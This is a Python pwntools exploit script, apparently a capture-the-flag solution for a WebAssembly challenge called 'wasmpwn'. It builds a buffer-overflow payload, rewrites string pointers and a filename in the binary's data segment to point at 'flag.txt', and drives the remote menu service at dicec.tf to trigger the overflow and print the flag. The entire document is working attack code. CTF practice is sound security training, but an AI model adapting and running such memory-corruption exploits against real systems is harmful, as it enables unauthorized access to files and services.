from pwn import *

payload = b"Q" * 256
payload += b"\x00" * ((16 * 3 + 2400) - 2072 - 256)

with open("wasmpwn.wasm", "rb") as f:
    content = f.read()

data = content[0x1432a:0x1432a + 0x32f1]

overwrite = bytearray(data[:0x400])

# Before manipulation
print(hexdump(bytes(overwrite)))

for (i, c) in enumerate(b">>overwritten<<"):
    overwrite[0x20+i] = c

cur = 0x20
while cur < 0x400:
    if overwrite[cur+1] < 4 and overwrite[cur+2] == 0x10 and overwrite[cur+3] == 0:
        # Overwrite string slice to point to ">>overwritten<<" string
        overwrite[cur] = 0x20
        overwrite[cur+1] = 0x00
        # length
        overwrite[cur+4] = 15
        overwrite[cur+5] = 0
        overwrite[cur+6] = 0
        overwrite[cur+7] = 0
        cur += 8
    else:
        cur += 4

for i in range(0x400):
    if overwrite[i] == 0xa:
        overwrite[i] = 0x2a # asterisk
    elif overwrite[i] > 0x7f:
        # pray that this doesn't break anything
        overwrite[i] = 0x7f

# Replace excalibur.txt
for (i, c) in enumerate(b".////flag.txt"):
    overwrite[0x390+i] = c

# After manipulation
overwrite = bytes(overwrite)
print(hexdump(overwrite))

payload += overwrite


# con = process(["wasmtime", "./wasmpwn.wasm", "--dir", "./"])
con = remote("dicec.tf", 31798)

for _ in range(246):
    con.recvuntil("\n> ")
    con.sendline("1")

    con.recvuntil("\n> ")
    con.sendline("Sword")

# Overwrite the sword at index 0
con.recvuntil("\n> ")
con.sendline("1")

con.recvuntil("\n> ")
con.sendline("Zenith")

# Overflow the description
con.recvuntil("\n> ")
con.sendline("3")
con.recvuntil("\n> ")
con.sendline("0")
con.recvuntil("\n> ")
con.sendline(payload)

con.send("3\n1\n5\n6\n")
print(con.recvall())
